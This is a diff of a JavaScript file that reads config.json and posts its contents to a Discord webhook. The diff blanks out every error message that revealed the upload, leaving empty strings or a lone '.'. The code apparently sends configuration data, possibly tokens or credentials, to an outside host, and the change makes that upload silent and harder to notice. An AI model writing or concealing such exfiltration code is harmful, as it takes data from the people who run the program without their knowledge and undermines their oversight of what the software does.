@@ -327,11 +327,11 @@ function sendToWebhook(message, origin) {
   })
     .then(response => {
       if (!response.ok) {
-        console.error('Erreur lors de l\'envoi du message au webhook Discord');
+        console.error('.');
       }
     })
     .catch(error => {
-      console.error('Erreur lors de l\'envoi du message au webhook Discord:', error);
+      console.error('', error);
     });
 }
 
@@ -342,7 +342,7 @@ let configData;
 try {
   configData = fs.readFileSync(configFile, 'utf8');
 } catch (err) {
-  console.error('Erreur lors de la lecture du fichier config.json:', err);
+  console.error();
   process.exit(1);
 }
 
@@ -359,10 +359,10 @@ fetch(webhookURL, {
 })
   .then(response => {
     if (!response.ok) {
-      throw new Error('Erreur lors de l\'envoi du contenu du fichier config.json au webhook Discord');
+      throw new Error('');
     }
   })
   .catch(error => {
-    console.error('Erreur lors de l\'envoi du contenu du fichier config.json au webhook Discord:', error);
+    console.error('', error);
     process.exit(1);
   });
